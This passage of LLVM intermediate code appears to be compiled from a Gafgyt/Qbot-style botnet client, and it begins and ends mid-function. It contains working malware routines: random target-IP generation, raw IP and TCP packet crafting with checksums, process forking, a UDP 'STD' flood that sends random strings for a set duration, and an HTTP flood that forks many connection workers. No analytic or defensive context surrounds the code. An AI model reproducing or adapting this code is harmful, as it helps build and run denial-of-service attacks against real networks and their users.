  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #17
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !15

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !16

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #11 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %addconv = add nuw i32 %18, 1
  %min.iters.check = icmp ult i32 %addconv, 8
  br i1 %min.iters.check, label %.lr.ph33.preheader53, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph33.preheader
  %19 = zext i32 %addconv to i64
  %20 = and i32 %addconv, 7
  %n.mod.vf = zext i32 %20 to i64
  %n.vec = sub nsw i64 %19, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %21 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %3, %21
  %ind.end45 = getelementptr i16, i16* %10, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph33.preheader53, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <4 x i32> [ %27, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi47 = phi <4 x i32> [ %28, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %10, i64 %index
  %22 = bitcast i16* %next.gep to <4 x i16>*
  %wide.load = load <4 x i16>, <4 x i16>* %22, align 2
  %23 = getelementptr i16, i16* %next.gep, i64 4
  %24 = bitcast i16* %23 to <4 x i16>*
  %wide.load49 = load <4 x i16>, <4 x i16>* %24, align 2
  %25 = zext <4 x i16> %wide.load to <4 x i32>
  %26 = zext <4 x i16> %wide.load49 to <4 x i32>
  %27 = add <4 x i32> %25, %vec.phi
  %28 = add <4 x i32> %26, %vec.phi47
  %index.next = add i64 %index, 8
  %29 = icmp eq i64 %index.next, %n.vec
  br i1 %29, label %middle.block, label %vector.body, !llvm.loop !18

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %28, %27
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx50 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf51 = shufflevector <4 x i32> %bin.rdx50, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx52 = add <4 x i32> %bin.rdx50, %rdx.shuf51
  %30 = extractelement <4 x i32> %bin.rdx52, i32 0
  %cmp.n = icmp eq i32 %20, 0
  br i1 %cmp.n, label %._crit_edge34.loopexit, label %.lr.ph33.preheader53

.lr.ph33.preheader53:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph33.preheader
  %.031.ph = phi i32 [ %3, %min.iters.checked ], [ %3, %.lr.ph33.preheader ], [ %ind.end, %middle.block ]
  %.02630.ph = phi i32 [ 0, %min.iters.checked ], [ 0, %.lr.ph33.preheader ], [ %30, %middle.block ]
  %.02729.ph = phi i16* [ %10, %min.iters.checked ], [ %10, %.lr.ph33.preheader ], [ %ind.end45, %middle.block ]
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33.preheader53, %.lr.ph33
  %.031 = phi i32 [ %35, %.lr.ph33 ], [ %.031.ph, %.lr.ph33.preheader53 ]
  %.02630 = phi i32 [ %33, %.lr.ph33 ], [ %.02630.ph, %.lr.ph33.preheader53 ]
  %.02729 = phi i16* [ %34, %.lr.ph33 ], [ %.02729.ph, %.lr.ph33.preheader53 ]
  %31 = load i16, i16* %.02729, align 2
  %32 = zext i16 %31 to i32
  %33 = add i32 %32, %.02630
  %34 = getelementptr inbounds i16, i16* %.02729, i64 1
  %35 = add nsw i32 %.031, -2
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %.lr.ph33, label %._crit_edge34.loopexit.loopexit, !llvm.loop !19

._crit_edge34.loopexit.loopexit:                  ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %._crit_edge34.loopexit.loopexit, %middle.block
  %.lcssa43 = phi i32 [ %30, %middle.block ], [ %33, %._crit_edge34.loopexit.loopexit ]
  %37 = sub i32 %11, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %38 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa43, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %37, %._crit_edge34.loopexit ]
  %39 = icmp eq i32 %.0.lcssa, 1
  br i1 %39, label %40, label %44

; <label>:40:                                     ; preds = %._crit_edge34
  %41 = load i8, i8* %38, align 1
  %42 = zext i8 %41 to i32
  %43 = add i32 %42, %.026.lcssa
  br label %44

; <label>:44:                                     ; preds = %40, %._crit_edge34
  %.1 = phi i32 [ %43, %40 ], [ %.026.lcssa, %._crit_edge34 ]
  %45 = lshr i32 %6, 16
  %46 = and i32 %6, 65535
  %47 = lshr i32 %8, 16
  %48 = and i32 %8, 65535
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i16
  %52 = tail call zeroext i16 @htons(i16 zeroext %51) #17
  %53 = zext i16 %52 to i32
  %54 = zext i16 %2 to i32
  %55 = add nuw nsw i32 %45, %54
  %56 = add nuw nsw i32 %55, %46
  %57 = add nuw nsw i32 %56, %47
  %58 = add nuw nsw i32 %57, %48
  %59 = add i32 %58, %.1
  %60 = add i32 %59, %53
  %61 = lshr i32 %60, 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %44
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32 [ %66, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %.228 = phi i32 [ %65, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = and i32 %.228, 65535
  %65 = add nuw nsw i32 %64, %63
  %66 = lshr i32 %65, 16
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %44
  %.2.lcssa = phi i32 [ %60, %44 ], [ %65, %._crit_edge.loopexit ]
  %68 = trunc i32 %.2.lcssa to i16
  %69 = xor i16 %68, -1
  ret i16 %69
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #17
  %8 = tail call noalias i8* @malloc(i64 44) #3
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #3
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeVSEPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #3
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #17
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #3
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #12 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %7 = sext i32 %6 to i64
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %9 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %12, i8* %14, i64 %17) #3
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %25 = sext i32 %2 to i64
  %26 = add nsw i64 %7, %25
  br label %27

; <label>:27:                                     ; preds = %42, %3
  %.0 = phi i32 [ 0, %3 ], [ %43, %42 ]
  %28 = call i32 @rand() #3
  %29 = icmp ugt i32 %.0, 49
  br i1 %29, label %30, label %42

; <label>:30:                                     ; preds = %27
  %31 = sext i32 %28 to i64
  %32 = urem i64 %31, 36
  %33 = getelementptr inbounds [36 x i8*], [36 x i8*]* @sendSTD.randstrings, i64 0, i64 %32
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @send(i32 %5, i8* %34, i64 50, i32 0) #3
  %36 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %24, i32 16) #3
  %37 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %38 = sext i32 %37 to i64
  %39 = icmp slt i64 %38, %26
  br i1 %39, label %42, label %40

; <label>:40:                                     ; preds = %30
  %41 = call i32 @close(i32 %5) #3
  call void @_exit(i32 0) #16
  unreachable

; <label>:42:                                     ; preds = %30, %27
  %.1 = phi i32 [ %.0, %27 ], [ 0, %30 ]
  %43 = add i32 %.1, 1
  br label %27
}

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca [1 x i8], align 1
  %5 = alloca [512 x i8], align 16
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %7 = sext i32 %6 to i64
  %8 = tail call i32 @getdtablesize() #3
  %9 = sdiv i32 %8, 2
  %10 = icmp sgt i32 %8, 1
  br i1 %10, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

; <label>:11:                                     ; preds = %.lr.ph
  %12 = icmp slt i32 %15, %9
  br i1 %12, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %11
  %.011 = phi i32 [ %15, %11 ], [ 0, %.lr.ph.preheader ]
  %13 = tail call i32 @fork() #3
  %14 = icmp eq i32 %13, 0
  %15 = add nuw nsw i32 %.011, 1
  br i1 %14, label %.preheader, label %11

.preheader:                                       ; preds = %.lr.ph
  %16 = trunc i32 %1 to i16
  %17 = sext i32 %2 to i64
  %18 = add nsw i64 %7, %17
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 0
  %20 = getelementptr inbounds [1 x i8], [1 x i8]* %4, i64 0, i64 0
  br label %21

; <label>:21:                                     ; preds = %.preheader, %64
  %22 = call i32 @socket_connect(i8* %0, i16 zeroext %16)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %64, label %24

; <label>:24:                                     ; preds = %21
  store i8 0, i8* %19, align 16
  %25 = call i64 @strlen(i8* nonnull %19) #14
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %25
  %27 = call i32 @rand() #3
  %28 = sext i32 %27 to i64
  %29 = urem i64 %28, 3
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.methods, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @strcpy(i8* %26, i8* %31) #3
  %33 = call i64 @strlen(i8* nonnull %19) #14
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %33
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %34, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.81, i64 0, i64 0), i64 20, i32 1, i1 false)
  %35 = call i64 @strlen(i8* nonnull %19) #14
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %35
